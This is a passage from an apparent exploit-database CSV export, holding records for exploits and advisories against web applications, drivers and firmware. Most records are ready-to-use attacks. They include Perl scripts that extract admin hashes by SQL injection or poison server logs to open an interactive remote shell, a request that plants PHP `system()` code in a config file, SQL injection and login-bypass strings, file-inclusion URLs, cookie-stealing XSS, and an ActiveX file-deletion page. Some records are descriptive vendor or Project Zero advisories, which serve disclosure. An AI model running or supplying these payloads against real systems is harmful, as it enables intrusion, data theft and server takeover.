community						#  #										# #################################################################################  use LWP::UserAgent; if (@ARGV < 1){ print ""-------------------------------------------------------------------------\r\n""; print ""                 TutorialCMS <= 1.00 SQL Injection Exploit\r\n""; print ""-------------------------------------------------------------------------\r\n""; print ""Usage: w4ck1ng_tutorialcms.pl [PATH]\r\n\r\n""; print ""[PATH] = Path where TutorialCMS is located\r\n\r\n""; print ""e.g. w4ck1ng_tutorialcms.pl http://victim.com/tutorialcms/\r\n""; print ""-------------------------------------------------------------------------\r\n""; print ""            		 http://www.w4ck1ng.com\r\n""; print ""            		        ...Silentz\r\n""; print ""-------------------------------------------------------------------------\r\n""; exit(); }  $useragent = LWP::UserAgent->new() or die ""Could not initialize browser\n""; $useragent->agent('Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1)');  $sql = $ARGV[0] . ""search.php?search=' UNION SELECT 0,0,0,0,username,password,0,0,password,0,password,0,0 FROM users WHERE id='1' /*""; $result = $useragent->request(HTTP::Request->new(GET=>$sql));  if($result->content =~ /""><b><u>([0-9a-zA-Z]+)<\/u>/){ print ""-------------------------------------------------------------------------\r\n""; print ""                 TutorialCMS <= 1.00 SQL Injection Exploit\r\n""; print ""-------------------------------------------------------------------------\r\n""; print ""[+] Admin User : $1\n""; }  else {print ""\n[-] Unable to retrieve admin username...""}  if($result->content =~ /([0-9a-fA-F]{32})/){ print ""[+] Admin Hash : $1\n""; print ""-------------------------------------------------------------------------\r\n""; print ""            		 http://www.w4ck1ng.com\r\n""; print ""            		        ...Silentz\r\n""; print ""-------------------------------------------------------------------------\r\n""; }  else {print ""\n[-] Unable to retrieve admin hash...\n"";}  # milw0rm.com [2007-05-09]",.w4ck1ng.,1
24465,"CubeCart 5.2.0 - 'cubecart.class.php' PHP Object Injection ------------------------------------------------------------------------- CubeCart <= 5.2.0 (cubecart.class.php) PHP Object Injection Vulnerability -------------------------------------------------------------------------   [-] Software Link:  http://www.cubecart.com/   [-] Affected Versions:  All versions from 5.0.0 to 5.2.0   [-] Vulnerability Description:  The vulnerable code is located in the Cubecart::_basket() method defined in the /classes/cubecart.class.php script:  519.	// Update shipping values 520.	if (isset($_POST['shipping']) && !empty($_POST['shipping'])) { 521.	    $GLOBALS['cart']->set('shipping', unserialize(base64url_decode($_POST['shipping']))); 522.	    if (!isset($_POST['proceed'])) { 523.	        httpredir(currentPage()); 524.	    } 525.	}  User input passed through the $_POST['shipping'] parameter is not properly sanitized before being used in an unserialize() call at line 521. This can be exploited to inject an arbitrary object into the application scope. For e.g. the destructor method of the ""Config"" class could be abused:  78.	public function __destruct() { 79.	    //Do we need to write to the db 80.	    if ($this->_write_db) { 81.	        $this->_writeDB(); 82.	    } 83.	}  By sending a specially crafted serialized ""Config"" object, an attacker might be able to change the application configuration settings with arbitrary values, and this can lead to make the application vulnerable to malicious attacks such as Cross-Site Scripting, SQL Injection or Denial of Service.   [-] Solution:  Upgrade to version 5.2.1 or higher.   [-] Disclosure Timeline:  [27/01/2013] - Issue reported to http://bugs.cubecart.com/view.php?id=511 [31/01/2013] - Version 5.2.1 released: http://forums.cubecart.com/?showtopic=47026 [31/01/2013] - CVE number requested [04/02/2013] - CVE number assigned [06/02/2013] - Public disclosure   [-] CVE Reference:  The Common Vulnerabilities and Exposures project (cve.mitre.org) has assigned the name CVE-2013-1465 to this vulnerability.   [-] Credits:  Vulnerability discovered by Egidio Romano.   [-] Original Advisory:  http://karmainsecurity.com/KIS-2013-02",.cubecart.,1
7831,"Ninja Blog 4.8 - Remote Information Disclosure Vendor: http://ninjadesigns.co.uk Version(s): Ninja Blog 4.8 (May also affect earlier versions) Credit: Danny Moules Critical: Yes  See PUSH 55 Advisory at http://www.push55.co.uk/index.php?s=ad&id=6  ----  Due to insufficient validation of client-side data, we can alter the path of files to be read to a file outside the intended directory.  The following PoC will read a file named 'test.txt' one level above the application folder.  ---  <?php  $strToRead = ""../../test.txt%00""; //Designates 'test.txt', sat one level above the application folder, to be read $strSite = ""http://www.example.com/ninjablog4.8/""; //Don't forget the trailing slash  $objCurl = curl_init(); curl_setopt($objCurl, CURLOPT_URL, $strSite.""entries/index.php?cat="".$strToRead); curl_setopt($objCurl, CURLOPT_RETURNTRANSFER, true);  echo(""Getting data...\n""); $strDump = curl_exec($objCurl);  curl_close($objCurl);  echo(""<div style=\""border: solid 2px black; padding: 10px; margin: 10px;\"">$strDump</div>\n"");  ?>  # milw0rm.com [2009-01-19]",Ninja,1
41806,"Broadcom Wi-Fi SoC - Heap Overflow 'wlc_tdls_cal_mic_chk' Due to Large RSN IE in TDLS Setup Confirm Frame Source: https://bugs.chromium.org/p/project-zero/issues/detail?id=1047  Broadcom produces Wi-Fi HardMAC SoCs which are used to handle the PHY and MAC layer processing. These chips are present in both mobile devices and Wi-Fi routers, and are capable of handling many Wi-Fi related events without delegating to the host OS.  One of the events handled by the BCM firmware is the processing of TDLS connections (802.11z). TDLS connections allow clients to exchange data between one another without passing it through the AP (thus preventing congestion at the AP).  In order to verify the integrity of TDLS messages, each message exchanged between the TDLS peers includes a message integrity code (MIC). The MIC is calculated using AES-CMAC with a key derived during the setup process (TPK-KCK).  When a TDLS Setup Request frame is sent by either one of the peers in an established TDLS connection, the receiving client must verify the MIC before processing the request. The MIC for TDLS Setup Request and TDLS Setup Confirm frames is calculated as follows:  AES-CMAC(TPK-KCK, InitiatorMAC       ||                   ResponderMAC       ||                   TransactionSeq     ||                   LinkID-IE          ||                   RSN-IE             ||                   TimeoutInterval-IE ||                   FastTransition-IE)  (see ""wpa_tdls_ftie_mic"" under https://w1.fi/cgit/hostap/plain/src/rsn_supp/tdls.c)  All TDLS connections are accepted automatically from any peer and are handled solely by the BCM firmware (meaning there is no need for user interaction or involvement in any way - once a TDLS Setup Request is received by the firmware, it will proceed with the TDLS handshake and subsequently create a TDLS connection with the requesting peer).  When the BCM firmware receives a TDLS Setup request frame, it verifies the MIC and responds with a TDLS Setup Response frame. The initiator then sends a TDLS Setup confirm frame in order to establish the connection. The BCM firmware uses the ""wlc_tdls_cal_mic_chk"" function to calculate the MIC of the received frames (both for the setup and the confirm). When processing the TDLS Setup Request frame, the RSN IE is verified and parsed in order to proceed with the derivation of the TPK. This verification also makes sure that the length of the RSN IE is valid for the chosen encryption type. However, when a TDLS Setup Confirm (M3) message is received, the firmware fails to verify the RSN IE, before calling the ""wlc_tdls_cal_mic_chk"" function in order to verify the MIC of the incoming frame.  The ""wlc_tdls_cal_mic_chk"" function allocates a buffer of size 256 on the heap, into which the needed information elements are gathered in order to calculate the AES-CMAC. However, the function does not sufficiently verify the length of the RSN IE included in the Setup Confirm frame. This allows an attacker to include an abnormally large RSN IE, causing a heap-overflow in ""wlc_tdls_cal_mic_chk"".  Here is the approximate simplified high-level code for the function:  1.  uint8_t* buffer = malloc(256); 2.  uint8_t* pos = buffer; 3.   4.  //Copying the initial (static) information 5.  uint8_t* linkid_ie = bcm_parse_tlvs(..., 101); 6.  memcpy(pos, linkid_ie + 0x8, 0x6);  pos += 0x6;            //Initiator MAC 7.  memcpy(pos, linkid_ie + 0xE, 0x6);  pos += 0x6;            //Responder MAC 8.  *pos = transaction_seq;             pos++;                 //TransactionSeq 9.  memcpy(pos, linkid_ie, 0x14);       pos += 0x14;           //LinkID-IE 10.  11. //Copying the RSN IE 12. uint8_t* rsn_ie = bcm_parse_tlvs(..., 48); 13. if (rsn_ie[1] + 2 + (pos - buffer) > 0xFF) { 14.     ... //Handle overflow 15. } 16. memcpy(pos, rsn_ie, rsn_ie[1] + 2); pos += rsn_ie[1] + 2;  //RSN-IE 17.  18. //Copying the remaining IEs 19. uint8_t* timeout_ie = bcm_parse_tlvs(..., 56); 20. uint8_t* ft_ie      = bcm_parse_tlvs(..., 55); 21. memcpy(pos, timeout_ie, 0x7);       pos += 0x7;            //Timeout Interval IE 22. memcpy(pos, ft_ie, 0x54);           pos += 0x54;           //Fast-Transition IE  As can be seen above, although the function verifies that the RSN IE's length does not exceed the allocated buffer (line 13), it fails to verify that the subsequent IEs also do not overflow the buffer. As such, setting the RSN IE's length to a large value (i.e., such that rsn_ie[1] + 2 + (pos - buffer) == 0xFF) will cause the Timeout Interval and Fast Transition IEs to be copied out-of-bounds, overflowing the buffer.  It should be noted that prior to calculating the MIC, the function in charge of processing the TDLS Setup Confirm frame calls a helper function in order to verify the nonce values in the FTIE (to make sure they match the nonces in the TDLS Setup Request and TDLS Setup Response frames, M1 & M2). However, since the attacker is the initiator of the TDLS connection, they may choose the value of Snonce (bytes [52-84) of the FTIE) arbitrarily. This leaves only the Anonce (bytes [20-52) of the FTIE) as uncontrolled bytes during the overflow, since they are chosen by the responder.  It should also be noted that the heap implementation used in the BCM firmware does not perform safe unlinking or include heap header cookies, allowing heap overflows such as the one described above to be exploited more reliably.  I'm attaching a patch to wpa_supplicant 2.6 which modifies the TDLS Setup Confirm frame sent by the supplicant in order to trigger the heap overflow. You can reproduce the issue by following these steps:    1. Download wpa_supplicant 2.6 from https://w1.fi/releases/wpa_supplicant-2.6.tar.gz   2. Apply the included patch file   3. Build wpa_supplicant (with TDLS support)   4. Use wpa_supplicant to connect to a network   5. Connect to wpa_cli:     5.1. Setup a TDLS connection to the BCM peer using ""TDLS_SETUP <MAC_ADDRESS_OF_PEER>""  (Where MAC_ADDRESS_OF_PEER is the MAC address of a peer with a BCM SoC which is associated to the same network).  At this point the heap overflow will be triggered. The code in the patch will corrupt the heap, causing the remote BCM SoC to reset after a while.  I've been able to verify this vulnerability on the BCM4339 chip, running version 6.37.34.40 (as present on the Nexus 5). However, I believe this vulnerability's scope includes a wider range of Broadcom SoCs and versions.   Proof of Concept: https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/41806.zip",Broadcom,1
34189,"Sphider Search Engine 1.3.6 - Multiple Vulnerabilities # Exploit Title: Sphider 1.3.6 or later SQL Injection # Google Dork: intitle:""Sphider Admin Login"" # Date: 1 July 2014 # Exploit Author: Mike Manzotti # Vendor Homepage: http://www.sphider.eu/ # Software Link: http://www.sphider.eu/sphider-1.3.6.zip # Version: v 1.3.6  Description: The web application is vulnerable to SQLi. Once a website has been indexed with Sphider, an attacker can inject SQL under Sites -> Browser pages-> filter option.  Proof of Concept: Response: POST: /admin/admin.php per_page=10&filter='union+select+1,@@version+;#&start=1&site_id=1&f=21  Response: <tr class=""grey""> <td><a href=""5.5.35-0+wheezy1"">5.5.35-0+wheezy1</a></td> <td width=""8%""> [cid:image001.jpg@01CFAA73.0B6B8330]    # Exploit Title: Sphider 1.3.6 or later PHP Injection  Description: An authenticated user can inject PHP code in configuration settings. This would allow an attacker to take full control of the server. Note that in v1.3.5 authentication can be bypassed. Also note that this issue depends on permissions of ""conf.php file"". However during the installation the user is advised to change the permissions of ""conf.php"" file to chmod 666.  Proof of Concept: Request: POST /admin/admin.php f=settings&Submit=1&_version_nr=1.3.5&_language=en&_template=standard&_admin_email=admin%40localhost&_print_results=1&_tmp_dir=tmp&_log_dir=log&_log_format=html&_min_words_per_page=10&_min_word_length=3&_word_upper_bound=100;system($_POST[cmd])&_index_numbers=1&_index_meta_keywords=1&_pdftotext_path=c%3A%5Ctemp%5Cpdftotext.exe&_catdoc_path=c%3A%5Ctemp%5Ccatdoc.exe&_xls2csv_path=c%3A%5Ctemp%5Cxls2csv&_catppt_path=c%3A%5Ctemp%5Ccatppt&_user_agent=Sphider&_min_delay=0&_strip_sessids=1&_results_per_page=10&_cat_columns=2&_bound_search_result=0&_length_of_link_desc=0&_links_to_next=9&_show_meta_description=1&_show_query_scores=1&_show_categories=1&_desc_length=250&_did_you_mean_enabled=1&_suggest_enabled=1&_suggest_history=1&_suggest_rows=10&_title_weight=20&_domain_weight=60&_path_weight=10&_meta_weight=5  ""system($_POST[cmd])"" has been injected.  Request: POST http://URL/sphider/settings/conf.php cmd=pwd  Response: /var/www/sphider/settings   # Exploit Title: Sphider 1.3.6 or later Stored and Reflected XSS  Description: The web application is prone to Stored and Reflected Cross site scripting.  Stored XSS: Request: POST /admin/admin.php f=7&parent=&category=<script>alert(document.cookie)</script>  Response <a href=""admin.php?f=edit_cat&cat_id=1""> <script>alert(document.cookie) </script> </a>  Reflected XSS:  Request: POST /sphider/admin/admin.php f=index&adv=1&url=""/><script>alert(document.cookie)</script>  Response: <a href=""admin.php?f=edit_cat&cat_id=1""> <script>alert(document.cookie) </script> </a>   Solution: Currently none. The author has been informed.  Timeline: 1 July 2014: The author has been informed 28 July 2014: Vulnerability published",.sphider.eu,1
40377,"Open-Xchange Guard 2.4.2 - Multiple Cross-Site Scripting Vulnerabilities Product: OX Guard Vendor: OX Software GmbH  Internal reference: 47878 (Bug ID) Vulnerability type: Cross Site Scripting (CWE-80) Vulnerable version: 2.4.2 and earlier Vulnerable component: guard Report confidence: Confirmed Solution status: Fixed by Vendor Fixed version: 2.4.0-rev11, 2.4.2-rev5 Researcher credits: Benjamin Daniel Mussler (@dejavuln) Vendor notification: 2016-08-03 Solution date: 2016-08-18 Public disclosure: 2016-09-13 CVE reference: CVE-2016-6854 CVSS: 6.5 (CVSS:3.0/AV:N/AC:L/PR:N/UI:R/S:U/C:L/I:N/A:N)  Vulnerability Details: Script code which got injected to a mail with inline PGP signature gets executed when verifying the signature.  Risk: Malicious script code can be executed within a users context. This can lead to session hijacking or triggering unwanted actions via the web interface (sending mail, deleting data etc.).  Steps to reproduce: 1. Add JS code to a mail body 2. Use PGP inline signatures 3. Open the mail in OX App Suite  Solution: Users should not open mail from untrusted sources. We made sure that the verified content does not get handled in a way that code can get executed. Operators should update to the latest Patch Release.    Internal reference: 47914 (Bug ID) Vulnerability type: Cross Site Scripting (CWE-80) Vulnerable version: 2.4.2 and earlier Vulnerable component: guard Report confidence: Confirmed Solution status: Fixed by Vendor Fixed version: 2.4.0-rev11, 2.4.2-rev5 Researcher credits: secator Vendor notification: 2016-08-05 Solution date: 2016-08-18 Public disclosure: 2016-09-13 CVE reference: CVE-2016-6853 CVSS: 4.3 (CVSS:3.0/AV:N/AC:L/PR:N/UI:R/S:U/C:L/I:N/A:N)  Vulnerability Details: Script code and references to external websites can be injected to the names of PGP public keys. When requesting that key later on using a specific URL, such script code might get executed. In case of injecting external websites, users might get lured into a phishing scheme.  Risk: Malicious script code can be executed within a users context. This can lead to session hijacking or triggering unwanted actions via the web interface (sending mail, deleting data etc.).  Steps to reproduce: 1. As attacker, create a PGP key with malicious name 2. Get the key ID and create a link which will fetch that key 3. Make the victim call that link  Solution: Users should not click links from untrusted sources. We now sanitize the returned key and make sure HTML content does not get interpreted by the browser. Operators should update to the latest Patch Release.    Internal reference: 48080 (Bug ID) Vulnerability type: Cross Site Scripting (CWE-80) Vulnerable version: 2.4.2 and earlier Vulnerable component: guard Report confidence: Confirmed Solution status: Fixed by Vendor Fixed version: 2.4.0-rev11, 2.4.2-rev5 Researcher credits: Benjamin Daniel Mussler (@dejavuln) Vendor notification: 2016-08-15 Solution date: 2016-08-18 Public disclosure: 2016-09-13 CVE reference: CVE-2016-6851 CVSS: 4.3 (CVSS:3.0/AV:N/AC:L/PR:N/UI:R/S:U/C:L/I:N/A:N)  Vulnerability Details: Script code can be provided as parameter to the OX Guard guest reader web application. This allows cross-site scripting attacks against arbitrary users since no prior authentication is needed.  Risk: Malicious script code can be executed within a users context. This can lead to session hijacking or triggering unwanted actions via the web interface (sending mail, deleting data etc.) in case the user has a active session on the same domain already.  Steps to reproduce: 1. As attacker, create a hyperlink with script code included at the ""templid"" parameter 2. Make the victim open that link  Solution: Users should not click links from untrusted sources. We now sanitize the returned content for this parameter. Operators should update to the latest Patch Release.",Open-Xchange,1
14265,"Joomla! Component PaymentsPlus 2.1.5 - Blind SQL Injection Critical Level 	: HIGH Vendor Url : http://paymentsplus.com.au/ Author : Sid3^effects aKa HaRi <shell_c99[at]yahoo.com> special thanks to : r0073r (inj3ct0r.com),L0rd CruSad3r,MaYur,MA1201,KeDar,Sonic,gunslinger_ greetz to :www.topsecure.net ,All ICW members and my friends :) luv y0 guyz  ######################################################## #   I'm SiD3^effects member from Inj3ct0r Team         # #    Support e-mail  : submit[at]inj3ct0r.com          # ######################################################## ###################################################################################################### Xploit:BSQli Vulnerability  Demo Url: http://server/games/gambling/add.html?type=[BSQLi] ######################################################################################################## # 0day no more  # Sid3^effects",Joomla!,1
5765,"ASPilot Pilot Cart 7.3 - 'article' SQL Injection |-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=| |     _                   __           __       __          ______     | |   /' \            __  /'__`\        /\ \__  /'__`\       /\  ___\    | |  /\_, \    ___   /\_\/\_\L\ \    ___\ \ ,_\/\ \/\ \  _ __\ \ \__/    | |  \/_/\ \ /' _ `\ \/\ \/_/_\_<_  /'___\ \ \/\ \ \ \ \/\`'__\ \___``\  | |     \ \ \/\ \/\ \ \ \ \/\ \L\ \/\ \__/\ \ \_\ \ \_\ \ \ \/ \/\ \L\ \ | |      \ \_\ \_\ \_\_\ \ \ \____/\ \____\\ \__\\ \____/\ \_\  \ \____/ | |       \/_/\/_/\/_/\ \_\ \/___/  \/____/ \/__/ \/___/  \/_/   \/___/  | |                  \ \____/ >> Kings of injection                      | |                   \/___/                                             | |                                                                      | |-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=|  [+] Script Name    : Pilot Cart 7.3 Remote SQL Injection Exploit  |+| Team           : injEct0r5  [+] Author         : Bl@ckbe@rD ('Tunisian TerrorisT') ;  [+] Script URL     : www.pilotcart.com  [+] Contact        : blackbeard-sql[A.T]hotmail{.}fr ;  --//-->  [+] Expl0iT :  pilot.asp?pg=kb&article={SQL}  {SQL} -->  115+union+select+Name,Name,Name+from+msysobjects  Or blind it :  {SQL} -->  IIF((select%20mid(last(Name),1,1)%20from%20(select%20top%2010%20Name%20from%20MSysObjects))='a',0,'Bingo')%00  --//-->  [+] GrEEtZ : allah , Xerror , hak3r-b0y ,King Of Hacker , UnderZ0ne Crew...  # milw0rm.com [2008-06-09]",.pilotcart.,1
40665,"NVIDIA Driver - Missing Bounds Check in Escape 0x100009a Source: https://bugs.chromium.org/p/project-zero/issues/detail?id=942  The DxgkDdiEscape handler for escape 0x100009a lacks proper bounds checks:  case 0x100009A:   ...   size_0 = escape_data->size_1;   ...   size_1 = 2 - (escape_data->unknown < 18);   ...   size_2 = escape_data->size_2;   ...   total_size = size_0 * size_1 * size_2;   ...    if (total_size > 0x10)     do_debug_thingo();    if (total_size) {     DWORD* ptr = alloced_buf + 24;     DWORD* user_buf = escape_data->data;     ...     while (total_size) {       *(ptr - 1) = *(user_buf - 1);       *ptr = *user_buf;       ...       user_buf += 4;       ptr += 39;       --total_size;     }  There is a check that total_size > 0x10, which calls some kind of a debug/logging function (do_debug_thingo in my pseudocode), but it does not actually stop processing of the escape. This leads to buffer overflow on the allocated pool buffer later on.  Note that there is also a potential integer overflow in the calculation of |total_size|. Since the individual sizes (size_0, size_1, size_2) appear to be stored in a struct and eventually passed off to another function, there may be more problems later on too.  Crashing context with PoC (Win10 x64 with 372.54):  PAGE_FAULT_IN_NONPAGED_AREA (50) Invalid system memory was referenced.  This cannot be protected by try-except. Typically the address is just plain bad or it is pointing at freed memory. ... rax=00000000caa6ed30 rbx=0000000000000000 rcx=ffffc001cd337044 rdx=00000000000f41bd rsi=0000000000000000 rdi=0000000000000000 rip=fffff80102461188 rsp=ffffd000243bbed0 rbp=ffffd000243bbfd0  r8=0000000000000000  r9=0000000000000000 r10=0000000000000000 r11=0000000000000000 r12=0000000000000000 r13=0000000000000000 r14=0000000000000000 r15=0000000000000000 iopl=0         nv up ei pl nz na po nc nvlddmkm!nvDumpConfig+0x12a2b0: fffff801`02461188 8941fc          mov     dword ptr [rcx-4],eax ds:ffffc001`cd337040=????????   Proof of Concept: https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/40665.zip",NVIDIA,1
9656,"Aurora CMS 1.0.2 - 'install.plugin.php' Remote File Inclusion --------------------------------------------------------------------------------------------------------------- Aurora Content Management System (Enterprise Edition) [install.plugin.php] <= Remote File Include Vulnerability  ---------------------------------------------------------------------------------------------------------------   ********************************************************************************************************************************** * [+] Author 		: EA Ngel                           									 * * [+] Situs		: www[dot]manadocoding[dot]net										 * * [+] Location		: Indonesia								                         	 * * [+] Contact		: engelpemula[at]gmail[dot]com										 * * [+] Download script	: http://biznetnetworks.dl.sourceforge.net/project/cronos/aurora/aurora_1.0.2/AURORA_1.0.2_stable.tar.gz * *																 *															         * **********************************************************************************************************************************   a. Dork 		: kreasikan otak-mu  :)   b. Bug			: - install.plugin.php                           - global $AURORA_MODULES_FOLDER;                             require_once $AURORA_MODULES_FOLDER.'/install/classes/install.class.php';   [@] Exploit		: http://localhost/[path]/public_html/add-ons/modules/sysmanager/plugins/install.plugin.php?AURORA_MODULES_FOLDER=[moonlee.txt?]   [#] Special Thanks	: str0ke      - manadocoding      : basix, cr4wl3r, Mr.C, cokiki, bl4ck_3n91n3, tonaas, night_prophet, blue_eye, angky_tatoki                           g4pt3k, michel_taung, doniskynet, rezagmas, Mr.Crossbeam, bolodewo and friend's       - Sekuritionline    : cyberlog, k1n9k0ng, fl3xu5, exnome, dbanie, d4rkz, setiawan, kujang_lapuk, jantap, k3nz0                           and friend's                                     - lain-lain         : akiko, steve_san, steve_diving, b0b0h0, yadiyauri, ipay, nTc, chawanua, S4NT4, my_wishdom                           alan_sarante, jajack, chrezz,  wendyz, wishnu, kiddies, anjaz chux, is-mail, is-blank, P2,                            C6, missi, mizz, hygao, b1beh^p1nk, tasya, san-san and friend's   [/] Note		: NOW FAITH is the assurance (the confirmation, the title deed) of the things [we] hope for,                            being the proof of things [we] do not see and the conviction of their reality [faith perceiving                            as real fact what is not revealed to the senses].   =================================================================================================================================== = 13 September 2009 > Monalisa happy b'day!! may add up in everything, always close to God and wish u all the best. Jesus bless u = ===================================================================================================================================  # milw0rm.com [2009-09-14]",Aurora,1
43275,"Entrepreneur Job Portal Script 2.0.6 - 'jobsearch_all.php?rid1' SQL Injection # # # # #  # Exploit Title: Entrepreneur Job Portal Script 2.0.6 - SQL Injection # Dork: N/A # Date: 08.12.2017 # Vendor Homepage: https://www.phpscriptsmall.com/ # Software Link: https://www.phpscriptsmall.com/product/entrepreneur-job-portal-script/ # Demo: http://freelancewebdesignerchennai.com/demo/job-portal/ # Version: 2.0.6 # Category: Webapps # Tested on: WiN7_x64/KaLiLinuX_x64 # CVE: N/A # # # # # # Exploit Author: Ihsan Sencan # Author Web: http://ihsan.net # Author Social: @ihsansencan # # # # # # Description: # The vulnerability allows an attacker to inject sql commands.... #  # Proof of Concept:  #  # 1) # http://localhost/[PATH]/jobsearch_all.php?rid1=[SQL] #  # -1'++UNION(SELECT(1),(2),(3),(/*!08888Select*/+export_set(5,@:=0,(/*!08888select*/+count(*)/*!08888from*/(information_schema.columns)where@:=export_set(5,export_set(5,@,/*!08888table_name*/,0x3c6c693e,2),/*!08888column_name*/,0xa3a,2)),@,2)),(5),(6),(7),(8),(9),(10),(11),(12),(13),(14),(15),(16),(17),(18),(19),(20),(21),(22),(23),(24),(25),(26),(27),(28),(29),(30),(31),(32),(33),(34),(35),(36),(37),(38),(39),(40),(41),(42),(43),(44),(45),(46),(47),(48),(49),(50),(51),(52),(53),(54))--+- #  #  # # # # #",entrepreneur_job_portal_script_project,1
3225,"Galeria Zdjec 3.0 - 'zd_numer.php' Local File Inclusion #!/usr/bin/perl #[Script Name: Galeria Zdjec <= v3.0 (zd_numer.php) Local File Include Exploit #[Coded by   : ajann #[Author     : ajann #[Contact    : :( #[$$         :  Free use IO::Socket; use LWP::Simple; @apache=( ""../../../../../var/log/httpd/access_log"", ""../../../../../var/log/httpd/error_log"", ""../apache/logs/error.log"", ""../apache/logs/access.log"", ""../../apache/logs/error.log"", ""../../apache/logs/access.log"", ""../../../apache/logs/error.log"", ""../../../apache/logs/access.log"", ""../../../../apache/logs/error.log"", ""../../../../apache/logs/access.log"", ""../../../../../apache/logs/error.log"", ""../../../../../apache/logs/access.log"", ""../logs/error.log"", ""../logs/access.log"", ""../../logs/error.log"", ""../../logs/access.log"", ""../../../logs/error.log"", ""../../../logs/access.log"", ""../../../../logs/error.log"", ""../../../../logs/access.log"", ""../../../../../logs/error.log"", ""../../../../../logs/access.log"", ""../../../../../etc/httpd/logs/access_log"", ""../../../../../etc/httpd/logs/access.log"", ""../../../../../etc/httpd/logs/error_log"", ""../../../../../etc/httpd/logs/error.log"", ""../../.. /../../var/www/logs/access_log"", ""../../../../../var/www/logs/access.log"", ""../../../../../usr/local/apache/logs/access_log"", ""../../../../../usr/local/apache/logs/access.log"", ""../../../../../var/log/apache/access_log"", ""../../../../../var/log/apache/access.log"", ""../../../../../var/log/access_log"", ""../../../../../var/www/logs/error_log"", ""../../../../../var/www/logs/error.log"", ""../../../../../usr/local/apache/logs/error_log"", ""../../../../../usr/local/apache/logs/error.log"", ""../../../../../var/log/apache/error_log"", ""../../../../../var/log/apache/error.log"", ""../../../../../var/log/access_log"", ""../../../../../var/log/error_log"" ); if (@ARGV < 3){ print "" [======================================================================== [//     Galeria Zdjec <= v3.0 (zd_numer.php) Local File Include Exploit [//           Usage: galeria.pl [target] [path] [apachepath] [//                   Example: galeria.pl victim.com /galeria/ ../logs/error.log [//                           Vuln&Exp : ajann [======================================================================== ""; exit(); }  $host=$ARGV[0]; $path=$ARGV[1]; $apachepath=$ARGV[2];  print ""Injecting code in log files...\n""; $CODE=""<?php ob_clean();system(\$HTTP_COOKIE_VARS[cmd]);die;?>""; $socket = IO::Socket::INET->new(Proto=>""tcp"", PeerAddr=>""$host"", PeerPort=>""80"") or die ""Connect Failed.\n\n""; print $socket ""GET "".$path.$CODE."" HTTP/1.1\r\n""; print $socket ""User-Agent: "".$CODE.""\r\n""; print $socket ""Host: "".$host.""\r\n""; print $socket ""Connection: close\r\n\r\n""; close($socket); print ""Write END to exit!\n""; print ""IF not working try another apache path\n\n"";  print ""[shell] "";$cmd = <STDIN>;  while($cmd !~ ""END"") {     $socket = IO::Socket::INET->new(Proto=>""tcp"", PeerAddr=>""$host"", PeerPort=>""80"") or die ""Connect Failed.\n\n"";     print $socket ""GET "".$path.""/zd_numer.php?galeria="".$apache[$apachepath].""&cmd=$cmd HTTP/1.1\r\n"";     print $socket ""Host: "".$host.""\r\n"";     print $socket ""Accept: */*\r\n"";     print $socket ""Connection: close\r\n\n"";      while ($raspuns = <$socket>)     {         print $raspuns;     }      print ""[shell] "";     $cmd = <STDIN>; }  # milw0rm.com [2007-01-30]",Galeria,1
4005,AdminBot 9.0.5 - 'live_status.lib.php' Remote File Inclusion #AdminBot-MX Remote file inclusion  #Download script : http://download.nexen.org/tools/adminbot/adminbot_http-mxb2.tar.gz  #Thanks Str0ke :D  #Exploit :  #http://127.0.0.1/[adminbot_path]/lib/live_status.lib.php?ROOT=shell.txt?  #Discovered by ThE TiGeR  #Miro_Tiger[at]Hotmail.com  # milw0rm.com [2007-05-29],AdminBotMX,1
7041,"E-topbiz Online Store 1 - Authentication Bypass E-topbiz Online Store 1 (Auth Bypass) SQL Injection Vulnerability  author: ZoRLu  msn: trt-turk@hotmail.com  Home: www.z0rlu.blogspot.com  N0T: YALNIZLIK, YiTiRDi ANLAMINI YALNIZLIGIMDA : (   ( bIktIm a.q )  Exploit:  username: [real_admin_name] ' or ' 1=1  password: ZoRLu  note: generally admin name: admin    for demo:   http://e-topbiz.com/trafficdemos/store1/admin/login.php  username: admin ' or ' 1=1--  password: ZoRLu   thanks: str0ke & yildirimordulari.org  &  darkc0de.com  # milw0rm.com [2008-11-07]",.z0rlu.blogspot.,1
8257,"Orbit Downloader 2.8.7 - Arbitrary File Deletion [waraxe-2009-SA#073] - Arbitrary File Deletion in Orbit Downloader <= 2.8.7 ===============================================================================  Author: Janek Vind ""waraxe"" Date: 21. March 2009 Location: Estonia, Tartu Web: http://www.waraxe.us/advisory-73.html   Description of vulnerable software: ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~  Orbit Downloader, leader of download manager revolution, is devoted to new generation web (web2.0) downloading, such as video/music/streaming media from Myspace, YouTube, Imeem, Pandora, Rapidshare, support RTMP. And to make general downloading easier and faster.  http://www.orbitdownloader.com/   List of found vulnerabilities ===============================================================================  1. Arbitrary File Deletion ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~  CLSID: {3F1D494B-0CEF-4468-96C9-386E2E4DEC90} ProgID: Orbitmxt.Orbit Executable: orbitmxt.dll File Version: 2.1.0.2  Tested on following platforms:  1. Windows XP Pro SP3/IE 6 SP1 2. Windows Vista Ultimate 64-bit SP1/IE 7  In both cases IE security settings were default for Internet Zone. Exploitation tests ended successfully without any warnings or other interaction from Internet Explorer.  Proof Of Concept:  <html><head> <title>Orbit Downloader &lt;= 2.8.7 Arbitrary File Deletion PoC by waraxe</title> <script> function test() { 	waraxe.download('','','"" /Lc:\\test.txt ""','',1); } </script> </head><body> <object id=""waraxe"" name=""waraxe"" classid=""CLSID:3F1D494B-0CEF-4468-96C9-386E2E4DEC90"" width=""50"" height=""50""> </object> <br><center> <button onclick=""javascript:test();"">  Test  </button> </body></html>  For testing first create ""test.txt"" file to the C: root dir and then use IE and hit test button. ""test.txt"" should be deleted for now  :)    Disclosure Timeline: ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~  03/04/09 Developer contacted 03/04/09 